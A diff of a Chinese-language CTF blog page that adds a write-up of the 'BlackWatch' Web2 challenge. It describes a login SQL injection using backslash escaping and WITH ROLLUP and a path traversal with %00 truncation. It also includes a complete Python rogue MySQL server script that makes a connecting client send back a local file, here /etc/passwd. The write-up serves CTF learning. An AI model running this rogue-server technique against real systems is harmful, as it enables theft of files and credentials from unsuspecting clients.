@@ -31,8 +31,16 @@
 <meta property="og:description" content="开题是这样的一个登录界面">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://yoursite.com/2020/07/14/%5BBlackWatch%E5%85%A5%E7%BE%A4%E9%A2%98%5DWeb2/1.png">
+<meta property="og:image" content="http://yoursite.com/2020/07/14/%5BBlackWatch%E5%85%A5%E7%BE%A4%E9%A2%98%5DWeb2/2.png">
+<meta property="og:image" content="http://yoursite.com/2020/07/14/%5BBlackWatch%E5%85%A5%E7%BE%A4%E9%A2%98%5DWeb2/3.png">
+<meta property="og:image" content="http://yoursite.com/2020/07/14/%5BBlackWatch%E5%85%A5%E7%BE%A4%E9%A2%98%5DWeb2/4.png">
+<meta property="og:image" content="http://yoursite.com/2020/07/14/%5BBlackWatch%E5%85%A5%E7%BE%A4%E9%A2%98%5DWeb2/5.png">
+<meta property="og:image" content="http://yoursite.com/2020/07/14/%5BBlackWatch%E5%85%A5%E7%BE%A4%E9%A2%98%5DWeb2/7.png">
+<meta property="og:image" content="http://yoursite.com/2020/07/14/%5BBlackWatch%E5%85%A5%E7%BE%A4%E9%A2%98%5DWeb2/6.png">
+<meta property="og:image" content="http://yoursite.com/2020/07/14/%5BBlackWatch%E5%85%A5%E7%BE%A4%E9%A2%98%5DWeb2/8.png">
+<meta property="og:image" content="http://yoursite.com/2020/07/14/%5BBlackWatch%E5%85%A5%E7%BE%A4%E9%A2%98%5DWeb2/9.png">
 <meta property="article:published_time" content="2020-07-14T04:31:53.000Z">
-<meta property="article:modified_time" content="2020-07-14T04:49:23.777Z">
+<meta property="article:modified_time" content="2020-07-14T05:45:20.972Z">
 <meta property="article:author" content="Peguin">
 <meta property="article:tag" content="blackwatch">
 <meta name="twitter:card" content="summary">
@@ -215,7 +223,7 @@
               <span class="post-meta-item-text">Posted on</span>
               
 
-              <time title="Created: 2020-07-14 12:31:53 / Modified: 12:49:23" itemprop="dateCreated datePublished" datetime="2020-07-14T12:31:53+08:00">2020-07-14</time>
+              <time title="Created: 2020-07-14 12:31:53 / Modified: 13:45:20" itemprop="dateCreated datePublished" datetime="2020-07-14T12:31:53+08:00">2020-07-14</time>
             </span>
 
           
@@ -231,6 +239,40 @@
       
         <p>开题是这样的一个登录界面<a id="more"></a></p>
 <img src="/2020/07/14/%5BBlackWatch%E5%85%A5%E7%BE%A4%E9%A2%98%5DWeb2/1.png" class="">
+
+<p>登录页面过滤了|’|or|and|#|等，注册界面好像没有过滤，这里可以抓包进行注册和登录</p>
+<p>猜测查询语句为：select xx from xx where username=’$username’ and password=’$password’ xxx;通过反斜杠转义单引号使得后面得password语句能够逃逸成功</p>
+<img src="/2020/07/14/%5BBlackWatch%E5%85%A5%E7%BE%A4%E9%A2%98%5DWeb2/2.png" class="">
+
+<p>注册成功，然后登录得时候要用到没接触过的知识点with rollup，具体作用可以去搜索一下看看有什么不一样的，我的理解是查到的数据会更多，即使某一列条件的值可能是NULL</p>
+<img src="/2020/07/14/%5BBlackWatch%E5%85%A5%E7%BE%A4%E9%A2%98%5DWeb2/3.png" class="">
+
+<p>登录成功，放包，成功登录到了后台</p>
+<img src="/2020/07/14/%5BBlackWatch%E5%85%A5%E7%BE%A4%E9%A2%98%5DWeb2/4.png" class="">
+
+<p>到这里思路卡住了，只知道flag和入群密码在根目录下面，题目提示了要用到内网靶机，应该要反弹shell，可是这里啥信息都没有，先来看看已经有得马，抓个包</p>
+<img src="/2020/07/14/%5BBlackWatch%E5%85%A5%E7%BE%A4%E9%A2%98%5DWeb2/5.png" class="">
+
+<p>看到数据以json形式返回，返回得是文件名，到这里猜测可能可以进行目录穿越，点应该在name这，自己写一个传上去，发现都会带上Webshell，应该是自动拼接的，用%00截断</p>
+<p>网页添加个分类，类名为穿越路径</p>
+<img src="/2020/07/14/%5BBlackWatch%E5%85%A5%E7%BE%A4%E9%A2%98%5DWeb2/7.png" class="">
+
+<p>再抓包，可以看到flag和密码文件</p>
+<img src="/2020/07/14/%5BBlackWatch%E5%85%A5%E7%BE%A4%E9%A2%98%5DWeb2/6.png" class="">
+
+<p>这里又出现了新问题，怎么读取文件内容，这题的考题还有sql注入，google，发现了sql伪服务器的脚本，那可能可以用</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment">#mysql_server.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.basicConfig(level=logging.DEBUG)</span><br><span class="line"></span><br><span class="line">filename=<span class="string">"/etc/passwd"</span></span><br><span class="line">sv=socket.socket()</span><br><span class="line">sv.bind((<span class="string">""</span>,<span class="number">3306</span>))</span><br><span class="line">sv.listen(<span class="number">5</span>)</span><br><span class="line">conn,address=sv.accept()</span><br><span class="line">logging.info(<span class="string">'Conn from: %r'</span>, address)</span><br><span class="line">conn.sendall(<span class="string">"\x4a\x00\x00\x00\x0a\x35\x2e\x35\x2e\x35\x33\x00\x17\x00\x00\x00\x6e\x7a\x3b\x54\x76\x73\x61\x6a\x00\xff\xf7\x21\x02\x00\x0f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x76\x21\x3d\x50\x5c\x5a\x32\x2a\x7a\x49\x3f\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00"</span>)</span><br><span class="line">conn.recv(<span class="number">9999</span>)</span><br><span class="line">logging.info(<span class="string">"auth okay"</span>)</span><br><span class="line">conn.sendall(<span class="string">"\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00"</span>)</span><br><span class="line">conn.recv(<span class="number">9999</span>)</span><br><span class="line">logging.info(<span class="string">"want file..."</span>)</span><br><span class="line">wantfile=chr(len(filename)+<span class="number">1</span>)+<span class="string">"\x00\x00\x01\xFB"</span>+filename</span><br><span class="line">conn.sendall(wantfile)</span><br><span class="line">content=conn.recv(<span class="number">9999</span>)</span><br><span class="line">logging.info(content)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://blog.csdn.net/shuteer_xu/article/details/104046895/，这篇文章进行了相关知识点的讲解，很详细，虽然用的工具有点区别，文章里的是github上集成的工具" target="_blank" rel="noopener">https://blog.csdn.net/shuteer_xu/article/details/104046895/，这篇文章进行了相关知识点的讲解，很详细，虽然用的工具有点区别，文章里的是github上集成的工具</a></p>
+<p>在内网靶机上启动sql服务之后，网址数据备份页面输入地址和端口点击连接测试就会有数据弹回</p>
+<img src="/2020/07/14/%5BBlackWatch%E5%85%A5%E7%BE%A4%E9%A2%98%5DWeb2/8.png" class="">
+
+<p>这里不重复操作了，靶机返回的数据带出了flag和入群密码</p>
+<img src="/2020/07/14/%5BBlackWatch%E5%85%A5%E7%BE%A4%E9%A2%98%5DWeb2/9.png" class="">
+
+
+
+
     </div>
 
     
@@ -317,7 +359,10 @@
     <a href="/2020/07/13/FireshellCTF2020/" rel="prev" title="FireshellCTF2020">
       <i class="fa fa-chevron-left"></i> FireshellCTF2020
     </a></div>
-      <div class="post-nav-item"></div>
+      <div class="post-nav-item">
+    <a href="/2020/07/14/SWPU2019web6/" rel="next" title="SWPU2019web6">
+      SWPU2019web6 <i class="fa fa-chevron-right"></i>
+    </a></div>
     </div>
       </footer>
     
@@ -400,14 +445,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">38</span>
+          <span class="site-state-item-count">42</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">25</span>
+        <span class="site-state-item-count">27</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
